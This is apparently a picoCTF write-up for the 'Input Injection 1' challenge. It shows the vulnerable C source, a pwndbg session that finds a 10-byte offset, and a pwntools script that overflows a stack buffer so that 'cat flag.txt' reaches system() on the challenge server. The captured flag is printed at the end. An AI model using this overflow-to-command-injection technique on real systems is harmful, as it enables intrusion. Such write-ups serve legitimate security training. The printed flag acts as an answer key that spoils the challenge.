# Input Injection 1

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/3206a2b3-3013-4d40-bfcf-1d0951bde547" />

**Tag:** `Binary Exploitation` `browser_webshell_solvable`

**Description:** 
> A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag? connect to the challenge instance nc saffron-estate.picoctf.net 51193. You can Download the program file here. And source code

**Attachments:** `vuln` `vuln.c`

**Hints:**

<details>
<summary>Hint 1</summary>

Look closely at how the program stores and uses your input.

</details>

**Author:** Yahaya Meddy

**Solved:** `726 users solved`

---

# Solution

This program defines an array of 10 bytes. You can see the source code below.

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h> 

void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
```

And to get the flag, we have to use the shell command cat flag.txt. It can be seen at the top that it uses *cmd. So we need to fill in the buffer and also the name. Well, it's right in this name that we will insert the command. Actually, I was just bored to send the payload b'A'*10 + cat flag.txt. Because I saw that each of them was filled with an array of 10 bytes. But we will use a closer approach by using pwndbg

If we check this, here is the address location and also its function.
```asm
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  strcpy@plt
0x00000000004010b0  puts@plt
0x00000000004010c0  system@plt
0x00000000004010d0  printf@plt
0x00000000004010e0  strcspn@plt
0x00000000004010f0  fgets@plt
0x0000000000401100  fflush@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  main
0x0000000000401276  fun
0x00000000004012f0  __libc_csu_init
0x0000000000401360  __libc_csu_fini
0x0000000000401368  _fini
```

To validate the offset, let's stop the main function then system function and run the program by filling in any input buffer.

```asm
pwndbg> break main
Breakpoint 1 at 0x4011fe
pwndbg> cyclic 150
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
pwndbg> break system
Breakpoint 2 at 0x4010c0
pwndbg> run <<< $'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
Starting program: /home/spl1t4t3rminal/ctf/PICO_CTF/competition/vuln <<< $'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00000000004011fe in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0x4011f6 (main) ◂— endbr64
 RBX  0x7fffffffda88 —▸ 0x7fffffffdd95 ◂— '/home/spl1t4t3rminal/ctf/PICO_CTF/competition/vuln'
 RCX  0x7ffff7f92680 (__exit_funcs) —▸ 0x7ffff7f94000 (initial) ◂— 0
 RDX  0x7fffffffda98 —▸ 0x7fffffffddc8 ◂— 'HOSTTYPE=x86_64'
 RDI  1
 RSI  0x7fffffffda88 —▸ 0x7fffffffdd95 ◂— '/home/spl1t4t3rminal/ctf/PICO_CTF/competition/vuln'
 R8   0x401360 (__libc_csu_fini) ◂— endbr64
 R9   0x7ffff7fcbc80 (_dl_fini) ◂— push rbp
 R10  0x7fffffffd6b0 ◂— 0x800000
 R11  0x202
 R12  0
 R13  0x7fffffffda98 —▸ 0x7fffffffddc8 ◂— 'HOSTTYPE=x86_64'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0
 RBP  0x7fffffffd970 ◂— 1
 RSP  0x7fffffffd970 ◂— 1
 RIP  0x4011fe (main+8) ◂— sub rsp, 0xd0
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x4011fe <main+8>     sub    rsp, 0xd0              RSP => 0x7fffffffd8a0 (0x7fffffffd970 - 0xd0)
   0x401205 <main+15>    lea    rdi, [rip + 0xdf8]     RDI => 0x402004 ◂— 'What is your name?'
   0x40120c <main+22>    call   puts@plt                    <puts@plt>

   0x401211 <main+27>    mov    rax, qword ptr [rip + 0x2e48]     RAX, [stdout@@GLIBC_2.2.5]
   0x401218 <main+34>    mov    rdi, rax
   0x40121b <main+37>    call   fflush@plt                  <fflush@plt>

   0x401220 <main+42>    mov    rdx, qword ptr [rip + 0x2e49]     RDX, [stdin@@GLIBC_2.2.5]
   0x401227 <main+49>    lea    rax, [rbp - 0xd0]
   0x40122e <main+56>    mov    esi, 0xc8                         ESI => 0xc8
   0x401233 <main+61>    mov    rdi, rax
   0x401236 <main+64>    call   fgets@plt                   <fgets@plt>
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffd970 ◂— 1
01:0008│+008     0x7fffffffd978 —▸ 0x7ffff7dd4ca8 (__libc_start_call_main+120) ◂— mov edi, eax
02:0010│+010     0x7fffffffd980 —▸ 0x7fffffffda70 —▸ 0x7fffffffda78 ◂— 0x38 /* '8' */
03:0018│+018     0x7fffffffd988 —▸ 0x4011f6 (main) ◂— endbr64
04:0020│+020     0x7fffffffd990 ◂— 0x100400040 /* '@' */
05:0028│+028     0x7fffffffd998 —▸ 0x7fffffffda88 —▸ 0x7fffffffdd95 ◂— '/home/spl1t4t3rminal/ctf/PICO_CTF/competition/vuln'
06:0030│+030     0x7fffffffd9a0 —▸ 0x7fffffffda88 —▸ 0x7fffffffdd95 ◂— '/home/spl1t4t3rminal/ctf/PICO_CTF/competition/vuln'
07:0038│+038     0x7fffffffd9a8 ◂— 0x6d52ed66004c36e6
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0         0x4011fe main+8
   1   0x7ffff7dd4ca8 __libc_start_call_main+120
   2   0x7ffff7dd4d65 __libc_start_main+133
   3         0x40113e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

This section displays the registers, the disassembly of main, and the stack snapshot. You can see that RIP points to an address in main, indicating that we stopped before calling any input functions (e.g., fgets).
The Disassembly section shows that main performs fgets on the buffer at rbp - 0xd0.
The Stack snapshot indicates the initial stack layout at the main breakpoint.

Next we will continue the program until it shoots the system and goodbye

```asm
pwndbg> continue
Continuing.
What is your name?
Goodbye, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa!

Breakpoint 2, __libc_system (
    line=0x7fffffffd886 "aaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa") at ../sysdeps/posix/system.c:207
warning: 207    ../sysdeps/posix/system.c: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
*RAX  0x7fffffffd886 ◂— 'aaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
 RBX  0x7fffffffda88 —▸ 0x7fffffffdd95 ◂— '/home/spl1t4t3rminal/ctf/PICO_CTF/competition/vuln'
*RCX  0
*RDX  0x4052a0 ◂— 'Goodbye, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa!\n'
*RDI  0x7fffffffd886 ◂— 'aaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
*RSI  0
*R8   0
*R9   0
*R10  3
*R11  0x7ffff7dfe110 (system) ◂— test rdi, rdi
 R12  0
 R13  0x7fffffffda98 —▸ 0x7fffffffddc8 ◂— 'HOSTTYPE=x86_64'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0
*RBP  0x7fffffffd890 ◂— 'aaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
*RSP  0x7fffffffd858 —▸ 0x4012e3 (fun+109) ◂— nop
*RIP  0x7ffff7dfe110 (system) ◂— test rdi, rdi
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x7ffff7dfe110 <system>          test   rdi, rdi     0x7fffffffd886 & 0x7fffffffd886     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x7ffff7dfe113 <system+3>      ✘ je     system+16                   <system+16>

   0x7ffff7dfe115 <system+5>        jmp    do_system                   <do_system>
    ↓
   0x7ffff7dfdc90 <do_system>       push   r13
   0x7ffff7dfdc92 <do_system+2>     mov    edx, 1                       EDX => 1
   0x7ffff7dfdc97 <do_system+7>     push   r12
   0x7ffff7dfdc99 <do_system+9>     push   rbp
   0x7ffff7dfdc9a <do_system+10>    mov    rbp, rdi                     RBP => 0x7fffffffd886 ◂— 'aaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa...'
   0x7ffff7dfdc9d <do_system+13>    push   rbx
   0x7ffff7dfdc9e <do_system+14>    sub    rsp, 0x388                   RSP => 0x7fffffffd4b0 (0x7fffffffd838 - 0x388)
   0x7ffff7dfdca5 <do_system+21>    mov    rax, qword ptr fs:[0x28]     RAX, [0x7ffff7da8768] => 0xad4404748f8eb400
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp         0x7fffffffd858 —▸ 0x4012e3 (fun+109) ◂— nop
01:0008│-030         0x7fffffffd860 —▸ 0x402019 ◂— 0x6f4700656d616e75 /* 'uname' */
02:0010│-028         0x7fffffffd868 —▸ 0x7fffffffd8a0 ◂— 'aaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
03:0018│-020         0x7fffffffd870 —▸ 0x7ffff7f90fd0 (_IO_file_jumps) ◂— 0
04:0020│-018         0x7fffffffd878 ◂— 0x61616161ffffda88
05:0028│ rax-6 rdi-6 0x7fffffffd880 ◂— 'aaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
06:0030│-008         0x7fffffffd888 ◂— 'aaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
07:0038│ rbp         0x7fffffffd890 ◂— 'aaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa'
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7dfe110 system
   1         0x4012e3 fun+109
   2 0x6161616561616161 None
   3 0x6161616661616161 None
   4 0x6161616761616161 None
   5 0x6161616861616161 None
   6 0x6161616961616161 None
   7 0x6161616a61616161 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/gx $rdi
0x7fffffffd886: 0x6163616161616161
pwndbg> cyclic -l 0x6163616161616161
Finding cyclic pattern of 8 bytes: b'aaaaaaca' (hex: 0x6161616161616361)
Found at offset 10
pwndbg>
```

Well, you can see that the program has printed our input buffer and its execution stops in the system and gives the next address to be executed by the system.

At the bottom xgx $rdi reads 8 bytes (a dword) from the address stored in rdi. The value 0x61636161616161 is the hex representation of the cyclic pattern portion, and cyclic -l <hex> converts the 8-byte pattern back to a positional offset in the cyclic input. A result of 10 represents the first 10 bytes of the input up to this portion.

Next, let's exploit it by inserting our command, here is the script

```python
from pwn import remote

HOST="saffron-estate.picoctf.net"
PORT=54339

r = remote(HOST, PORT)
r.recvuntil(b"\n", timeout=1)
r.sendline(b"A"*10 + b"cat flag.txt")
print(r.recvall(timeout=5).decode(errors="ignore"))
r.close()

```

and we successfully did the buffer and got the flag

```bash
 zsh > python3 exploit.py
[+] Opening connection to saffron-estate.picoctf.net on port 54339: Done
[+] Receiving all data: Done (67B)
[*] Closed connection to saffron-estate.picoctf.net port 54339
Goodbye, AAAAAAAAAAcat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_3766e70a}
```

---

# FLAG: picoCTF{0v3rfl0w_c0mm4nd_3766e70a}
